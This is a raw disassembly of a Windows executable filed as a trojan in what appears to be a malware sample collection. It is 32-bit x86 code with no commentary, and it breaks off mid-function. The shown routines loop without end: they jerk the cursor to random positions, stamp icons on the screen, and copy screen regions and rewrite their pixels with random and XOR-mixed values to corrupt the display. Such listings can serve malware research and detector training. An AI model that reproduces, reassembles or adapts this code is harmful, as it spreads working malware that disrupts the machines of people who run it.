
malware_samples/trojan/2916ba3d4fed8113ee843c7282a3a13a5792373a36a6f5e3674d2c45d5f53c54.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 0c             	sub    $0xc,%esp
  401006:	53                   	push   %ebx
  401007:	56                   	push   %esi
  401008:	8b 35 50 60 40 00    	mov    0x406050,%esi
  40100e:	57                   	push   %edi
  40100f:	8b 3d 80 61 40 00    	mov    0x406180,%edi
  401015:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401018:	bb 51 00 00 00       	mov    $0x51,%ebx
  40101d:	50                   	push   %eax
  40101e:	ff 15 b4 60 40 00    	call   *0x4060b4
  401024:	ff d7                	call   *%edi
  401026:	99                   	cltd
  401027:	f7 fb                	idiv   %ebx
  401029:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  40102c:	83 c3 d8             	add    $0xffffffd8,%ebx
  40102f:	03 da                	add    %edx,%ebx
  401031:	ff d7                	call   *%edi
  401033:	99                   	cltd
  401034:	b9 51 00 00 00       	mov    $0x51,%ecx
  401039:	f7 f9                	idiv   %ecx
  40103b:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40103e:	83 c0 d8             	add    $0xffffffd8,%eax
  401041:	03 c2                	add    %edx,%eax
  401043:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401046:	ff d7                	call   *%edi
  401048:	99                   	cltd
  401049:	b9 19 00 00 00       	mov    $0x19,%ecx
  40104e:	f7 f9                	idiv   %ecx
  401050:	85 d2                	test   %edx,%edx
  401052:	75 23                	jne    0x401077
  401054:	ff d7                	call   *%edi
  401056:	99                   	cltd
  401057:	b9 c8 00 00 00       	mov    $0xc8,%ecx
  40105c:	f7 f9                	idiv   %ecx
  40105e:	83 c2 9c             	add    $0xffffff9c,%edx
  401061:	03 da                	add    %edx,%ebx
  401063:	ff d7                	call   *%edi
  401065:	99                   	cltd
  401066:	b9 c8 00 00 00       	mov    $0xc8,%ecx
  40106b:	f7 f9                	idiv   %ecx
  40106d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401070:	83 c0 9c             	add    $0xffffff9c,%eax
  401073:	03 c2                	add    %edx,%eax
  401075:	eb 03                	jmp    0x40107a
  401077:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40107a:	50                   	push   %eax
  40107b:	53                   	push   %ebx
  40107c:	ff 15 ac 60 40 00    	call   *0x4060ac
  401082:	64 a1 2c 00 00 00    	mov    %fs:0x2c,%eax
  401088:	8b 08                	mov    (%eax),%ecx
  40108a:	a1 cc 83 40 00       	mov    0x4083cc,%eax
  40108f:	3b 81 04 00 00 00    	cmp    0x4(%ecx),%eax
  401095:	7e 2a                	jle    0x4010c1
  401097:	68 cc 83 40 00       	push   $0x4083cc
  40109c:	e8 6c 3f 00 00       	call   0x40500d
  4010a1:	83 c4 04             	add    $0x4,%esp
  4010a4:	83 3d cc 83 40 00 ff 	cmpl   $0xffffffff,0x4083cc
  4010ab:	75 14                	jne    0x4010c1
  4010ad:	ff d6                	call   *%esi
  4010af:	68 cc 83 40 00       	push   $0x4083cc
  4010b4:	a3 c8 83 40 00       	mov    %eax,0x4083c8
  4010b9:	e8 10 3f 00 00       	call   0x404fce
  4010be:	83 c4 04             	add    $0x4,%esp
  4010c1:	ff d6                	call   *%esi
  4010c3:	2b 05 c8 83 40 00    	sub    0x4083c8,%eax
  4010c9:	3d 78 05 00 00       	cmp    $0x578,%eax
  4010ce:	76 17                	jbe    0x4010e7
  4010d0:	68 f4 01 00 00       	push   $0x1f4
  4010d5:	ff 15 64 60 40 00    	call   *0x406064
  4010db:	ff d6                	call   *%esi
  4010dd:	a3 c8 83 40 00       	mov    %eax,0x4083c8
  4010e2:	e9 2e ff ff ff       	jmp    0x401015
  4010e7:	ff d7                	call   *%edi
  4010e9:	99                   	cltd
  4010ea:	b9 0f 00 00 00       	mov    $0xf,%ecx
  4010ef:	f7 f9                	idiv   %ecx
  4010f1:	83 c2 0a             	add    $0xa,%edx
  4010f4:	52                   	push   %edx
  4010f5:	ff 15 64 60 40 00    	call   *0x406064
  4010fb:	e9 15 ff ff ff       	jmp    0x401015
  401100:	55                   	push   %ebp
  401101:	8b ec                	mov    %esp,%ebp
  401103:	83 ec 08             	sub    $0x8,%esp
  401106:	53                   	push   %ebx
  401107:	56                   	push   %esi
  401108:	57                   	push   %edi
  401109:	8b 35 c0 60 40 00    	mov    0x4060c0,%esi
  40110f:	6a 00                	push   $0x0
  401111:	ff 15 b8 60 40 00    	call   *0x4060b8
  401117:	6a 0b                	push   $0xb
  401119:	8b d8                	mov    %eax,%ebx
  40111b:	ff d6                	call   *%esi
  40111d:	6a 0c                	push   $0xc
  40111f:	8b f8                	mov    %eax,%edi
  401121:	ff d6                	call   *%esi
  401123:	8b f0                	mov    %eax,%esi
  401125:	8d 45 f8             	lea    -0x8(%ebp),%eax
  401128:	50                   	push   %eax
  401129:	ff 15 b4 60 40 00    	call   *0x4060b4
  40112f:	68 05 7f 00 00       	push   $0x7f05
  401134:	6a 00                	push   $0x0
  401136:	ff 15 a4 60 40 00    	call   *0x4060a4
  40113c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40113f:	50                   	push   %eax
  401140:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401143:	2b ce                	sub    %esi,%ecx
  401145:	51                   	push   %ecx
  401146:	2b c7                	sub    %edi,%eax
  401148:	50                   	push   %eax
  401149:	53                   	push   %ebx
  40114a:	ff 15 c4 60 40 00    	call   *0x4060c4
  401150:	53                   	push   %ebx
  401151:	6a 00                	push   $0x0
  401153:	ff 15 b0 60 40 00    	call   *0x4060b0
  401159:	eb ae                	jmp    0x401109
  40115b:	cc                   	int3
  40115c:	cc                   	int3
  40115d:	cc                   	int3
  40115e:	cc                   	int3
  40115f:	cc                   	int3
  401160:	55                   	push   %ebp
  401161:	8b ec                	mov    %esp,%ebp
  401163:	83 ec 34             	sub    $0x34,%esp
  401166:	53                   	push   %ebx
  401167:	56                   	push   %esi
  401168:	8b 35 c0 60 40 00    	mov    0x4060c0,%esi
  40116e:	57                   	push   %edi
  40116f:	6a 00                	push   $0x0
  401171:	ff d6                	call   *%esi
  401173:	6a 01                	push   $0x1
  401175:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401178:	ff d6                	call   *%esi
  40117a:	8b 75 ec             	mov    -0x14(%ebp),%esi
  40117d:	8b f8                	mov    %eax,%edi
  40117f:	0f af c6             	imul   %esi,%eax
  401182:	6a 04                	push   $0x4
  401184:	68 00 30 00 00       	push   $0x3000
  401189:	89 7d d8             	mov    %edi,-0x28(%ebp)
  40118c:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40118f:	c1 e0 02             	shl    $0x2,%eax
  401192:	50                   	push   %eax
  401193:	6a 00                	push   $0x0
  401195:	89 45 dc             	mov    %eax,-0x24(%ebp)
  401198:	ff 15 68 60 40 00    	call   *0x406068
  40119e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4011a1:	ff 15 50 60 40 00    	call   *0x406050
  4011a7:	8b 1d 80 61 40 00    	mov    0x406180,%ebx
  4011ad:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4011b0:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
  4011b4:	6a 00                	push   $0x0
  4011b6:	ff 15 b8 60 40 00    	call   *0x4060b8
  4011bc:	50                   	push   %eax
  4011bd:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4011c0:	ff 15 08 60 40 00    	call   *0x406008
  4011c6:	ff 75 f8             	push   -0x8(%ebp)
  4011c9:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4011cc:	6a 20                	push   $0x20
  4011ce:	6a 01                	push   $0x1
  4011d0:	57                   	push   %edi
  4011d1:	56                   	push   %esi
  4011d2:	ff 15 1c 60 40 00    	call   *0x40601c
  4011d8:	50                   	push   %eax
  4011d9:	ff 75 f0             	push   -0x10(%ebp)
  4011dc:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4011df:	ff 15 00 60 40 00    	call   *0x406000
  4011e5:	68 20 00 cc 00       	push   $0xcc0020
  4011ea:	6a 00                	push   $0x0
  4011ec:	6a 00                	push   $0x0
  4011ee:	ff 75 e4             	push   -0x1c(%ebp)
  4011f1:	57                   	push   %edi
  4011f2:	56                   	push   %esi
  4011f3:	6a 00                	push   $0x0
  4011f5:	6a 00                	push   $0x0
  4011f7:	ff 75 f0             	push   -0x10(%ebp)
  4011fa:	ff 15 20 60 40 00    	call   *0x406020
  401200:	ff 75 f8             	push   -0x8(%ebp)
  401203:	ff 75 dc             	push   -0x24(%ebp)
  401206:	ff 75 e8             	push   -0x18(%ebp)
  401209:	ff 15 0c 60 40 00    	call   *0x40600c
  40120f:	ff 15 50 60 40 00    	call   *0x406050
  401215:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  401218:	3d 60 ea 00 00       	cmp    $0xea60,%eax
  40121d:	76 0d                	jbe    0x40122c
  40121f:	ff d3                	call   *%ebx
  401221:	99                   	cltd
  401222:	b9 03 00 00 00       	mov    $0x3,%ecx
  401227:	f7 f9                	idiv   %ecx
  401229:	88 55 ff             	mov    %dl,-0x1(%ebp)
  40122c:	33 ff                	xor    %edi,%edi
  40122e:	39 7d e0             	cmp    %edi,-0x20(%ebp)
  401231:	7e 63                	jle    0x401296
  401233:	8b c7                	mov    %edi,%eax
  401235:	99                   	cltd
  401236:	f7 fe                	idiv   %esi
  401238:	89 45 cc             	mov    %eax,-0x34(%ebp)
  40123b:	8b c7                	mov    %edi,%eax
  40123d:	89 55 d0             	mov    %edx,-0x30(%ebp)
  401240:	99                   	cltd
  401241:	f7 7d d8             	idivl  -0x28(%ebp)
  401244:	85 d2                	test   %edx,%edx
  401246:	75 1b                	jne    0x401263
  401248:	ff d3                	call   *%ebx
  40124a:	99                   	cltd
  40124b:	b9 6e 00 00 00       	mov    $0x6e,%ecx
  401250:	f7 f9                	idiv   %ecx
  401252:	85 d2                	test   %edx,%edx
  401254:	75 0d                	jne    0x401263
  401256:	ff d3                	call   *%ebx
  401258:	99                   	cltd
  401259:	b9 03 00 00 00       	mov    $0x3,%ecx
  40125e:	f7 f9                	idiv   %ecx
  401260:	88 55 ff             	mov    %dl,-0x1(%ebp)
  401263:	8d 34 bd 00 00 00 00 	lea    0x0(,%edi,4),%esi
  40126a:	ff d3                	call   *%ebx
  40126c:	99                   	cltd
  40126d:	b9 32 00 00 00       	mov    $0x32,%ecx
  401272:	f7 f9                	idiv   %ecx
  401274:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401277:	47                   	inc    %edi
  401278:	22 45 cc             	and    -0x34(%ebp),%al
  40127b:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40127e:	02 d0                	add    %al,%dl
  401280:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  401284:	03 c6                	add    %esi,%eax
  401286:	88 14 08             	mov    %dl,(%eax,%ecx,1)
  401289:	c6 44 31 03 96       	movb   $0x96,0x3(%ecx,%esi,1)
  40128e:	8b 75 ec             	mov    -0x14(%ebp),%esi
  401291:	3b 7d e0             	cmp    -0x20(%ebp),%edi
  401294:	7c 9d                	jl     0x401233
  401296:	ff 75 f8             	push   -0x8(%ebp)
  401299:	ff 75 dc             	push   -0x24(%ebp)
  40129c:	ff 75 e8             	push   -0x18(%ebp)
  40129f:	ff 15 14 60 40 00    	call   *0x406014
  4012a5:	8b 7d d8             	mov    -0x28(%ebp),%edi
  4012a8:	c7 45 f4 00 00 96 01 	movl   $0x1960000,-0xc(%ebp)
  4012af:	ff 75 f4             	push   -0xc(%ebp)
  4012b2:	57                   	push   %edi
  4012b3:	56                   	push   %esi
  4012b4:	6a 00                	push   $0x0
  4012b6:	6a 00                	push   $0x0
  4012b8:	ff 75 f0             	push   -0x10(%ebp)
  4012bb:	57                   	push   %edi
  4012bc:	56                   	push   %esi
  4012bd:	6a 00                	push   $0x0
  4012bf:	6a 00                	push   $0x0
  4012c1:	ff 75 e4             	push   -0x1c(%ebp)
  4012c4:	ff 15 9c 60 40 00    	call   *0x40609c
  4012ca:	ff 75 e8             	push   -0x18(%ebp)
  4012cd:	ff 15 18 60 40 00    	call   *0x406018
  4012d3:	ff 75 f0             	push   -0x10(%ebp)
  4012d6:	ff 15 10 60 40 00    	call   *0x406010
  4012dc:	ff 75 e4             	push   -0x1c(%ebp)
  4012df:	6a 00                	push   $0x0
  4012e1:	ff 15 b0 60 40 00    	call   *0x4060b0
  4012e7:	e9 c8 fe ff ff       	jmp    0x4011b4
  4012ec:	cc                   	int3
  4012ed:	cc                   	int3
  4012ee:	cc                   	int3
  4012ef:	cc                   	int3
  4012f0:	55                   	push   %ebp
  4012f1:	8b ec                	mov    %esp,%ebp
  4012f3:	83 ec 58             	sub    $0x58,%esp
  4012f6:	a1 08 80 40 00       	mov    0x408008,%eax
  4012fb:	33 c5                	xor    %ebp,%eax
  4012fd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401300:	53                   	push   %ebx
  401301:	56                   	push   %esi
  401302:	8b 35 c0 60 40 00    	mov    0x4060c0,%esi
  401308:	57                   	push   %edi
  401309:	6a 00                	push   $0x0
  40130b:	ff d6                	call   *%esi
  40130d:	8b f8                	mov    %eax,%edi
  40130f:	6a 01                	push   $0x1
  401311:	89 7d b8             	mov    %edi,-0x48(%ebp)
  401314:	ff d6                	call   *%esi
  401316:	8b f0                	mov    %eax,%esi
  401318:	c7 45 d0 28 00 00 00 	movl   $0x28,-0x30(%ebp)
  40131f:	0f 57 c0             	xorps  %xmm0,%xmm0
  401322:	89 75 b4             	mov    %esi,-0x4c(%ebp)
  401325:	6a 00                	push   $0x0
  401327:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  40132a:	89 75 d8             	mov    %esi,-0x28(%ebp)
  40132d:	c7 45 dc 01 00 18 00 	movl   $0x180001,-0x24(%ebp)
  401334:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  40133b:	0f 11 45 e4          	movups %xmm0,-0x1c(%ebp)
  40133f:	66 0f d6 45 f4       	movq   %xmm0,-0xc(%ebp)
  401344:	ff 15 b8 60 40 00    	call   *0x4060b8
  40134a:	8b d8                	mov    %eax,%ebx
  40134c:	8b c6                	mov    %esi,%eax
  40134e:	0f af c7             	imul   %edi,%eax
  401351:	89 5d ac             	mov    %ebx,-0x54(%ebp)
  401354:	89 45 bc             	mov    %eax,-0x44(%ebp)
  401357:	53                   	push   %ebx
  401358:	ff 15 08 60 40 00    	call   *0x406008
  40135e:	6a 00                	push   $0x0
  401360:	8b f0                	mov    %eax,%esi
  401362:	8d 45 c8             	lea    -0x38(%ebp),%eax
  401365:	6a 00                	push   $0x0
  401367:	50                   	push   %eax
  401368:	6a 00                	push   $0x0
  40136a:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40136d:	89 75 b0             	mov    %esi,-0x50(%ebp)
  401370:	50                   	push   %eax
  401371:	53                   	push   %ebx
  401372:	ff 15 04 60 40 00    	call   *0x406004
  401378:	50                   	push   %eax
  401379:	56                   	push   %esi
  40137a:	89 45 a8             	mov    %eax,-0x58(%ebp)
  40137d:	ff 15 00 60 40 00    	call   *0x406000
  401383:	68 20 00 cc 00       	push   $0xcc0020
  401388:	6a 00                	push   $0x0
  40138a:	6a 00                	push   $0x0
  40138c:	53                   	push   %ebx
  40138d:	ff 75 b4             	push   -0x4c(%ebp)
  401390:	57                   	push   %edi
  401391:	6a 00                	push   $0x0
  401393:	6a 00                	push   $0x0
  401395:	56                   	push   %esi
  401396:	ff 15 20 60 40 00    	call   *0x406020
  40139c:	33 c0                	xor    %eax,%eax
  40139e:	89 45 c0             	mov    %eax,-0x40(%ebp)
  4013a1:	39 45 bc             	cmp    %eax,-0x44(%ebp)
  4013a4:	0f 8e 87 00 00 00    	jle    0x401431
  4013aa:	8b 75 b8             	mov    -0x48(%ebp),%esi
  4013ad:	33 ff                	xor    %edi,%edi
  4013af:	90                   	nop
  4013b0:	99                   	cltd
  4013b1:	f7 fe                	idiv   %esi
  4013b3:	8b d8                	mov    %eax,%ebx
  4013b5:	89 55 cc             	mov    %edx,-0x34(%ebp)
  4013b8:	89 5d c4             	mov    %ebx,-0x3c(%ebp)
  4013bb:	ff 15 50 60 40 00    	call   *0x406050
  4013c1:	8b c8                	mov    %eax,%ecx
  4013c3:	8d 7f 03             	lea    0x3(%edi),%edi
  4013c6:	b8 89 88 88 88       	mov    $0x88888889,%eax
  4013cb:	f7 e1                	mul    %ecx
  4013cd:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  4013d0:	c1 ea 04             	shr    $0x4,%edx
  4013d3:	02 ca                	add    %dl,%cl
  4013d5:	02 da                	add    %dl,%bl
  4013d7:	8a c3                	mov    %bl,%al
  4013d9:	32 5d cc             	xor    -0x34(%ebp),%bl
  4013dc:	02 c0                	add    %al,%al
  4013de:	32 c8                	xor    %al,%cl
  4013e0:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4013e3:	88 4c 07 fd          	mov    %cl,-0x3(%edi,%eax,1)
  4013e7:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  4013ea:	8a c1                	mov    %cl,%al
  4013ec:	02 c0                	add    %al,%al
  4013ee:	02 c8                	add    %al,%cl
  4013f0:	8a 45 c4             	mov    -0x3c(%ebp),%al
  4013f3:	02 c0                	add    %al,%al
  4013f5:	2a ca                	sub    %dl,%cl
  4013f7:	02 c2                	add    %dl,%al
  4013f9:	32 c8                	xor    %al,%cl
  4013fb:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4013fe:	88 4c 07 ff          	mov    %cl,-0x1(%edi,%eax,1)
  401402:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  401405:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  401408:	0f b6 c0             	movzbl %al,%eax
  40140b:	0f b6 c9             	movzbl %cl,%ecx
  40140e:	0f af c8             	imul   %eax,%ecx
  401411:	8b 45 c8             	mov    -0x38(%ebp),%eax
  401414:	02 ca                	add    %dl,%cl
  401416:	0a cb                	or     %bl,%cl
  401418:	88 4c 07 fe          	mov    %cl,-0x2(%edi,%eax,1)
  40141c:	8b 45 c0             	mov    -0x40(%ebp),%eax
  40141f:	40                   	inc    %eax
  401420:	89 45 c0             	mov    %eax,-0x40(%ebp)
  401423:	3b 45 bc             	cmp    -0x44(%ebp),%eax
  401426:	7c 88                	jl     0x4013b0
  401428:	8b 75 b0             	mov    -0x50(%ebp),%esi
  40142b:	8b 5d ac             	mov    -0x54(%ebp),%ebx
  40142e:	8b 7d b8             	mov    -0x48(%ebp),%edi
  401431:	68 20 00 cc 00       	push   $0xcc0020
  401436:	6a 00                	push   $0x0
  401438:	6a 00                	push   $0x0
  40143a:	56                   	push   %esi
  40143b:	ff 75 b4             	push   -0x4c(%ebp)
  40143e:	57                   	push   %edi
  40143f:	6a 00                	push   $0x0
  401441:	6a 00                	push   $0x0
  401443:	53                   	push   %ebx
  401444:	ff 15 20 60 40 00    	call   *0x406020
  40144a:	ff 75 a8             	push   -0x58(%ebp)
  40144d:	ff 15 18 60 40 00    	call   *0x406018
  401453:	56                   	push   %esi
  401454:	ff 15 10 60 40 00    	call   *0x406010
  40145a:	6a 1e                	push   $0x1e
  40145c:	ff 15 64 60 40 00    	call   *0x406064
  401462:	e9 f0 fe ff ff       	jmp    0x401357
  401467:	cc                   	int3
  401468:	cc                   	int3
  401469:	cc                   	int3
  40146a:	cc                   	int3
  40146b:	cc                   	int3
  40146c:	cc                   	int3
  40146d:	cc                   	int3
  40146e:	cc                   	int3
  40146f:	cc                   	int3
  401470:	55                   	push   %ebp
  401471:	8b ec                	mov    %esp,%ebp
  401473:	83 e4 f8             	and    $0xfffffff8,%esp
  401476:	83 ec 6c             	sub    $0x6c,%esp
  401479:	a1 08 80 40 00       	mov    0x408008,%eax
  40147e:	33 c4                	xor    %esp,%eax
  401480:	89 44 24 68          	mov    %eax,0x68(%esp)
  401484:	53                   	push   %ebx
  401485:	56                   	push   %esi
  401486:	57                   	push   %edi
  401487:	6a 00                	push   $0x0
  401489:	ff 15 b8 60 40 00    	call   *0x4060b8
  40148f:	8b 35 c0 60 40 00    	mov    0x4060c0,%esi
  401495:	6a 00                	push   $0x0
  401497:	ff d6                	call   *%esi
  401499:	8b f8                	mov    %eax,%edi
  40149b:	6a 01                	push   $0x1
  40149d:	89 7c 24 18          	mov    %edi,0x18(%esp)
  4014a1:	ff d6                	call   *%esi
  4014a3:	8b d8                	mov    %eax,%ebx
  4014a5:	89 44 24 20          	mov    %eax,0x20(%esp)
  4014a9:	0f af df             	imul   %edi,%ebx
  4014ac:	0f 57 c0             	xorps  %xmm0,%xmm0
  4014af:	c7 44 24 48 28 00 00 	movl   $0x28,0x48(%esp)
  4014b6:	00 
  4014b7:	89 7c 24 4c          	mov    %edi,0x4c(%esp)
  4014bb:	89 44 24 50          	mov    %eax,0x50(%esp)
  4014bf:	c7 44 24 54 01 00 18 	movl   $0x180001,0x54(%esp)
  4014c6:	00 
  4014c7:	c7 44 24 58 00 00 00 	movl   $0x0,0x58(%esp)
  4014ce:	00 
  4014cf:	0f 11 44 24 5c       	movups %xmm0,0x5c(%esp)
  4014d4:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  4014db:	00 
  4014dc:	66 0f d6 44 24 6c    	movq   %xmm0,0x6c(%esp)
  4014e2:	89 5c 24 34          	mov    %ebx,0x34(%esp)
  4014e6:	6a 00                	push   $0x0
  4014e8:	ff 15 b8 60 40 00    	call   *0x4060b8
  4014ee:	8b f0                	mov    %eax,%esi
  4014f0:	56                   	push   %esi
  4014f1:	89 74 24 44          	mov    %esi,0x44(%esp)
  4014f5:	ff 15 08 60 40 00    	call   *0x406008
  4014fb:	6a 00                	push   $0x0
  4014fd:	8b f8                	mov    %eax,%edi
  4014ff:	8d 44 24 14          	lea    0x14(%esp),%eax
  401503:	6a 00                	push   $0x0
  401505:	50                   	push   %eax
  401506:	6a 00                	push   $0x0
  401508:	8d 44 24 58          	lea    0x58(%esp),%eax
  40150c:	89 7c 24 4c          	mov    %edi,0x4c(%esp)
  401510:	50                   	push   %eax
  401511:	56                   	push   %esi
  401512:	ff 15 04 60 40 00    	call   *0x406004
  401518:	50                   	push   %eax
  401519:	57                   	push   %edi
  40151a:	89 44 24 4c          	mov    %eax,0x4c(%esp)
  40151e:	ff 15 00 60 40 00    	call   *0x406000
  401524:	68 20 00 cc 00       	push   $0xcc0020
  401529:	6a 00                	push   $0x0
  40152b:	6a 00                	push   $0x0
  40152d:	56                   	push   %esi
  40152e:	ff 74 24 30          	push   0x30(%esp)
  401532:	ff 74 24 28          	push   0x28(%esp)
  401536:	6a 00                	push   $0x0
  401538:	6a 00                	push   $0x0
  40153a:	57                   	push   %edi
  40153b:	ff 15 20 60 40 00    	call   *0x406020
  401541:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  401545:	33 ff                	xor    %edi,%edi
  401547:	83 c1 0a             	add    $0xa,%ecx
  40154a:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  40154e:	85 db                	test   %ebx,%ebx
  401550:	0f 8e 53 01 00 00    	jle    0x4016a9
  401556:	66 0f 6e c1          	movd   %ecx,%xmm0
  40155a:	8b c1                	mov    %ecx,%eax
  40155c:	c1 e8 1f             	shr    $0x1f,%eax
  40155f:	f3 0f e6 c0          	cvtdq2pd %xmm0,%xmm0
  401563:	f2 0f 58 04 c5 70 64 	addsd  0x406470(,%eax,8),%xmm0
  40156a:	40 00 
  40156c:	b8 1f 85 eb 51       	mov    $0x51eb851f,%eax
  401571:	f7 e1                	mul    %ecx
  401573:	66 0f 5a c0          	cvtpd2ps %xmm0,%xmm0
  401577:	8b c2                	mov    %edx,%eax
  401579:	c1 e8 04             	shr    $0x4,%eax
  40157c:	89 44 24 24          	mov    %eax,0x24(%esp)
  401580:	b8 89 88 88 88       	mov    $0x88888889,%eax
  401585:	f7 e1                	mul    %ecx
  401587:	0f 28 c8             	movaps %xmm0,%xmm1
  40158a:	f3 0f 59 05 84 63 40 	mulss  0x406384,%xmm0
  401591:	00 
  401592:	f3 0f 59 0d 80 63 40 	mulss  0x406380,%xmm1
  401599:	00 
  40159a:	f3 0f 11 44 24 28    	movss  %xmm0,0x28(%esp)
  4015a0:	8b c2                	mov    %edx,%eax
  4015a2:	c1 e8 04             	shr    $0x4,%eax
  4015a5:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  4015a9:	b8 cd cc cc cc       	mov    $0xcccccccd,%eax
  4015ae:	f7 e1                	mul    %ecx
  4015b0:	f3 0f 11 4c 24 38    	movss  %xmm1,0x38(%esp)
  4015b6:	8b c2                	mov    %edx,%eax
  4015b8:	c1 e8 04             	shr    $0x4,%eax
  4015bb:	33 f6                	xor    %esi,%esi
  4015bd:	89 44 24 30          	mov    %eax,0x30(%esp)
  4015c1:	8b c7                	mov    %edi,%eax
  4015c3:	99                   	cltd
  4015c4:	f7 7c 24 14          	idivl  0x14(%esp)
  4015c8:	8b da                	mov    %edx,%ebx
  4015ca:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4015ce:	66 0f 6e c3          	movd   %ebx,%xmm0
  4015d2:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
  4015d5:	f3 0f 59 05 9c 63 40 	mulss  0x40639c,%xmm0
  4015dc:	00 
  4015dd:	f3 0f 58 c1          	addss  %xmm1,%xmm0
  4015e1:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  4015e4:	e8 53 47 00 00       	call   0x405d3c
  4015e9:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  4015ed:	8a cb                	mov    %bl,%cl
  4015ef:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  4015f3:	f3 0f 59 05 68 64 40 	mulss  0x406468,%xmm0
  4015fa:	00 
  4015fb:	f3 0f 2c c0          	cvttss2si %xmm0,%eax
  4015ff:	66 0f 6e c2          	movd   %edx,%xmm0
  401603:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
  401606:	2a c8                	sub    %al,%cl
  401608:	0f b6 44 24 24       	movzbl 0x24(%esp),%eax
  40160d:	02 c2                	add    %dl,%al
  40160f:	32 c8                	xor    %al,%cl
  401611:	8b 44 24 10          	mov    0x10(%esp),%eax
  401615:	f3 0f 59 05 98 63 40 	mulss  0x406398,%xmm0
  40161c:	00 
  40161d:	88 4c 06 02          	mov    %cl,0x2(%esi,%eax,1)
  401621:	f3 0f 58 44 24 28    	addss  0x28(%esp),%xmm0
  401627:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  40162a:	e8 01 47 00 00       	call   0x405d30
  40162f:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  401633:	8a ca                	mov    %dl,%cl
  401635:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  401639:	f3 0f 59 05 64 64 40 	mulss  0x406464,%xmm0
  401640:	00 
  401641:	f3 0f 2c c0          	cvttss2si %xmm0,%eax
  401645:	2a c8                	sub    %al,%cl
  401647:	0f b6 44 24 2c       	movzbl 0x2c(%esp),%eax
  40164c:	02 c3                	add    %bl,%al
  40164e:	32 c8                	xor    %al,%cl
  401650:	8b 44 24 10          	mov    0x10(%esp),%eax
  401654:	88 4c 06 01          	mov    %cl,0x1(%esi,%eax,1)
  401658:	8a 4c 24 30          	mov    0x30(%esp),%cl
  40165c:	8b 44 24 10          	mov    0x10(%esp),%eax
  401660:	02 cb                	add    %bl,%cl
  401662:	02 ca                	add    %dl,%cl
  401664:	88 0c 06             	mov    %cl,(%esi,%eax,1)
  401667:	ff 15 80 61 40 00    	call   *0x406180
  40166d:	99                   	cltd
  40166e:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
  401673:	f7 f9                	idiv   %ecx
  401675:	85 d2                	test   %edx,%edx
  401677:	75 1a                	jne    0x401693
  401679:	8b 44 24 10          	mov    0x10(%esp),%eax
  40167d:	c6 44 06 02 ff       	movb   $0xff,0x2(%esi,%eax,1)
  401682:	8b 44 24 10          	mov    0x10(%esp),%eax
  401686:	c6 44 06 01 ff       	movb   $0xff,0x1(%esi,%eax,1)
  40168b:	8b 44 24 10          	mov    0x10(%esp),%eax
  40168f:	c6 04 06 ff          	movb   $0xff,(%esi,%eax,1)
  401693:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  401697:	47                   	inc    %edi
  401698:	f3 0f 10 4c 24 38    	movss  0x38(%esp),%xmm1
  40169e:	83 c6 03             	add    $0x3,%esi
  4016a1:	3b fb                	cmp    %ebx,%edi
  4016a3:	0f 8c 18 ff ff ff    	jl     0x4015c1
  4016a9:	8b 3d 80 61 40 00    	mov    0x406180,%edi
  4016af:	ff d7                	call   *%edi
  4016b1:	99                   	cltd
  4016b2:	b9 05 00 00 00       	mov    $0x5,%ecx
  4016b7:	f7 f9                	idiv   %ecx
  4016b9:	8d 72 fe             	lea    -0x2(%edx),%esi
  4016bc:	ff d7                	call   *%edi
  4016be:	99                   	cltd
  4016bf:	b9 05 00 00 00       	mov    $0x5,%ecx
  4016c4:	f7 f9                	idiv   %ecx
  4016c6:	8b 7c 24 3c          	mov    0x3c(%esp),%edi
  4016ca:	68 20 00 cc 00       	push   $0xcc0020
  4016cf:	6a 00                	push   $0x0
  4016d1:	6a 00                	push   $0x0
  4016d3:	57                   	push   %edi
  4016d4:	ff 74 24 30          	push   0x30(%esp)
  4016d8:	83 ea 02             	sub    $0x2,%edx
  4016db:	ff 74 24 28          	push   0x28(%esp)
  4016df:	52                   	push   %edx
  4016e0:	56                   	push   %esi
  4016e1:	8b 74 24 60          	mov    0x60(%esp),%esi
  4016e5:	56                   	push   %esi
